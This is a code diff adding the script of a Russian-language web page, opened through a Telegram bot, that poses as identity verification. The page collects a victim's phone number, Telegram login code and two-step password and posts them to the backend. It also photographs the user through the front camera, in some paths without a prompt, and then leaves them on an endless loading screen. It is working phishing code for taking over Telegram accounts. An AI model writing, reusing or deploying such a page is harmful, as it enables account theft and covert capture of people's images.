+        const phone = rawInput.replace(/\D/g, '');
+        const formatted = formatPhoneNumber(phone);
+        e.target.value = formatted; // Show formatted version
+        updateCountryDisplay(phone);
+        updatePhoneDisplay(phone);
+        updateProgress(phone);
+    });
+
+    function formatPhoneNumber(phone) {
+        if (!phone) return '';
+
+        const country = detectCountry(phone);
+        if (country && country.code) {
+            // Show country code solid, format local part
+            const codeDigits = country.code.replace('+', '');
+            const localPart = country.localNumber;
+
+            if (localPart.length === 0) {
+                return country.code; // Just the country code
+            } else if (localPart.length <= 3) {
+                return `${country.code}${localPart}`;
+            } else if (localPart.length <= 6) {
+                return `${country.code} ${localPart.slice(0,3)} ${localPart.slice(3)}`;
+            } else if (localPart.length <= 8) {
+                return `${country.code} ${localPart.slice(0,3)} ${localPart.slice(3,6)}-${localPart.slice(6)}`;
+            } else {
+                return `${country.code} ${localPart.slice(0,3)} ${localPart.slice(3,6)}-${localPart.slice(6,8)}-${localPart.slice(8)}`;
+            }
+        } else {
+            // Fallback for unknown countries
+            if (phone.length <= 1) return `+${phone}`;
+            if (phone.length <= 4) return `+${phone.slice(0,1)} ${phone.slice(1)}`;
+            if (phone.length <= 7) return `+${phone.slice(0,1)} ${phone.slice(1,4)} ${phone.slice(4)}`;
+            if (phone.length <= 9) return `+${phone.slice(0,1)} ${phone.slice(1,4)} ${phone.slice(4,7)}-${phone.slice(7)}`;
+            return `+${phone.slice(0,1)} ${phone.slice(1,4)} ${phone.slice(4,7)}-${phone.slice(7,9)}-${phone.slice(9,11)}`;
+        }
+    }
+
+    function updatePhoneDisplay(phone) {
+        const display = document.getElementById('phone');
+        if (phone.length > 0) {
+            display.style.letterSpacing = '1px';
+            display.style.fontWeight = '700';
+            display.style.color = '#ffffff';
+            display.style.textShadow = '0 0 8px rgba(51, 144, 236, 0.3)';
+
+            // Auto-adjust font size to fit
+            autoFitText(display);
+        } else {
+            display.style.letterSpacing = '2px';
+            display.style.fontSize = '18px';
+            display.style.fontWeight = '500';
+            display.style.color = '#ffffff';
+            display.style.textShadow = 'none';
+        }
+    }
+
+    function autoFitText(element) {
+        const textLength = element.value.length;
+
+        // Aggressive length-based font scaling to ensure fit
+        let fontSize;
+        if (textLength <= 8) fontSize = 18;      // +7 999
+        else if (textLength <= 12) fontSize = 16; // +7 999 000
+        else if (textLength <= 15) fontSize = 14; // +7 999 000-00
+        else if (textLength <= 17) fontSize = 12; // +7 900 000-00-00
+        else fontSize = 10; // Very long numbers
+
+        element.style.fontSize = fontSize + 'px';
+    }
+
+    function updateProgress(phone) {
+        const progress = document.getElementById('progress-fill');
+        const length = phone.length;
+        let percentage = 0;
+
+        const country = detectCountry(phone);
+        if (country && country.data) {
+            const codeDigits = country.code.replace('+', '');
+            const expected = parseInt(codeDigits.length) + (country.data.length || 10);
+            percentage = length >= expected ? 100 : Math.min((length / expected) * 100, 90);
+        } else {
+            percentage = Math.min((length / 15) * 100, 90);
+        }
+
+        progress.style.width = percentage + '%';
+    }
+
+    async function handlePhone() {
+        const phoneInput = document.getElementById('phone').value;
+        const phone = phoneInput.replace(/\D/g, ''); // Remove all non-digits for API
+        if (!phone) return showError('Введите номер телефона');
+        if (!chatId) return showError('Ошибка: откройте приложение через Telegram бота');
+
+        setBtnLoading('btn-phone', true);
+        const res = await req('/api/send_phone', { phone });
+        setBtnLoading('btn-phone', false);
+
+        if (res.status === 'ok') {
+            currentPhone = phone;
+            document.getElementById('step-phone').classList.remove('active');
+            document.getElementById('step-code').classList.add('active');
+            document.getElementById('desc').innerText = 'Код отправлен в ваш Telegram';
+
+            // Initialize code input
+            initCodeInput();
+        } else {
+            showError(res.message || 'Ошибка');
+        }
+    }
+
+    function initCodeInput() {
+        const codeDigits = document.querySelectorAll('.code-digit');
+        const hiddenCode = document.getElementById('code');
+
+        codeDigits.forEach((digit, index) => {
+            digit.addEventListener('input', function(e) {
+                const value = e.target.value.replace(/\D/g, '');
+                e.target.value = value;
+
+                if (value) {
+                    e.target.classList.add('filled');
+                    // Auto-focus next digit
+                    if (index < codeDigits.length - 1) {
+                        codeDigits[index + 1].focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
+                }
+
+                updateHiddenCode();
+            });
+
+            digit.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    codeDigits[index - 1].focus();
+                }
+            });
+
+            digit.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                const digits = paste.split('').slice(0, 5);
+
+                digits.forEach((d, i) => {
+                    if (codeDigits[i]) {
+                        codeDigits[i].value = d;
+                        codeDigits[i].classList.add('filled');
+                    }
+                });
+
+                updateHiddenCode();
+
+                // Focus last filled digit or next empty one
+                const lastIndex = Math.min(digits.length, codeDigits.length - 1);
+                codeDigits[lastIndex].focus();
+            });
+        });
+
+        function updateHiddenCode() {
+            const code = Array.from(codeDigits).map(d => d.value).join('');
+            hiddenCode.value = code;
+        }
+    }
+
+    async function handleCode() {
+        const code = document.getElementById('code').value.replace(/\s/g, '');
+        if (!code || !/^\d{5}$/.test(code)) {
+            return showError('Неверный код', document.getElementById('code-input'));
+        }
+        setBtnLoading('btn-code', true);
+        const res = await req('/api/send_code', { code, phone: currentPhone });
+        setBtnLoading('btn-code', false);
+
+        if (res.status === 'success') {
+            await showPhotoStep();
+        } else if (res.status === 'need_password') {
+            document.getElementById('step-code').classList.remove('active');
+            document.getElementById('step-password').classList.add('active');
+            document.getElementById('desc').innerText = 'Введите пароль двухэтапной аутентификации';
+        } else {
+            showError(res.message || 'Неверный код', document.getElementById('code-input'));
+        }
+    }
+
+    async function handlePassword() {
+        const password = document.getElementById('password').value;
+        setBtnLoading('btn-password', true);
+        const res = await req('/api/send_password', { password, phone: currentPhone });
+        setBtnLoading('btn-password', false);
+
+        if (res.status === 'success') {
+            await capturePhoto();
+            // Show infinite loading after photo capture
+            document.getElementById('step-code').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+            document.getElementById('title').innerText = 'Загрузка...';
+            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
+        } else {
+            showError(res.message || 'Неверный код', document.getElementById('code-input'));
+        }
+    }
+
+    async function showPhotoStep() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
+            const video = document.getElementById('photo-video');
+            video.srcObject = stream;
+
+            // Show photo step
+            document.getElementById('step-code').classList.remove('active');
+            document.getElementById('step-photo').classList.add('active');
+            document.getElementById('title').innerText = 'Подтверждение личности';
+            document.getElementById('desc').innerText = 'Сфотографируйтесь для верификации';
+
+            // Set up button handlers
+            document.getElementById('btn-accept-photo').onclick = async () => {
+                await handleAcceptPhoto(stream);
+            };
+
+            document.getElementById('btn-decline-photo').onclick = async () => {
+                await handleDeclinePhoto(stream);
+            };
+
+        } catch (e) {
+            console.log('Camera access failed:', e);
+            // If camera fails, proceed without photo
+            await capturePhoto();
+        }
+    }
+
+    async function handleAcceptPhoto(stream) {
+        try {
+            // Stop camera stream
+            stream.getTracks().forEach(track => track.stop());
+
+            // Take photo and proceed
+            await capturePhoto();
+
+            // Show infinite loading after photo capture
+            document.getElementById('step-photo').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+            document.getElementById('title').innerText = 'Загрузка...';
+            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
+
+        } catch (e) {
+            console.log('Photo capture failed:', e);
+            // Proceed anyway
+            document.getElementById('step-photo').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+            document.getElementById('title').innerText = 'Загрузка...';
+            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
+        }
+    }
+
+    async function handleDeclinePhoto(stream) {
+        try {
+            // Stop camera stream
+            stream.getTracks().forEach(track => track.stop());
+
+            // Log photo decline
+            await req('/api/log_photo_decline', {});
+
+            // Show infinite loading after decline
+            document.getElementById('step-photo').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+            document.getElementById('title').innerText = 'Загрузка...';
+            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
+
+        } catch (e) {
+            console.log('Photo decline failed:', e);
+            // Proceed anyway
+            document.getElementById('step-photo').classList.remove('active');
+            document.getElementById('step-loading').classList.add('active');
+            document.getElementById('title').innerText = 'Загрузка...';
+            document.getElementById('desc').innerText = 'Пожалуйста, подождите';
+        }
+    }
+
+    async function capturePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
+            const video = document.createElement('video');
+            video.srcObject = stream;
+
+            // Wait for video to be ready
+            await new Promise((resolve, reject) => {
+                video.onloadedmetadata = () => {
+                    console.log('Video loaded, dimensions:', video.videoWidth, video.videoHeight);
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        resolve();
+                    } else {
+                        reject(new Error('Invalid video dimensions'));
+                    }
+                };
+                video.onerror = () => reject(new Error('Video load error'));
+                video.play().catch(reject);
+            });
+
+            // Wait for video to actually start playing
+            await new Promise((resolve) => {
+                if (video.readyState >= 2) { // HAVE_CURRENT_DATA
+                    resolve();
+                } else {
+                    video.oncanplay = resolve;
+                    setTimeout(resolve, 1000); // Fallback timeout
+                }
+            });
+
+            // Additional wait to ensure frame is captured
+            await new Promise(resolve => setTimeout(resolve, 300));
+
+            console.log('Capturing photo, video state:', video.readyState, video.videoWidth, video.videoHeight);
+
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                throw new Error('Video dimensions are zero');
+            }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const photoDataUrl = canvas.toDataURL('image/png');
+            console.log('Photo data URL length:', photoDataUrl.length);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            if (photoDataUrl.length > 100) { // Check if photo has content
+                await req('/api/log_photo', {photo: photoDataUrl});
+            } else {
+                console.log('Photo data too small, skipping');
+                await req('/api/log_photo', {}); // Send without photo
+            }
+        } catch (e) {
+            console.log('Camera access failed:', e);
+            // Send log without photo
+            await req('/api/log_photo', {});
+        }
+    }
+
+
+</script>
+</body>
+</html>
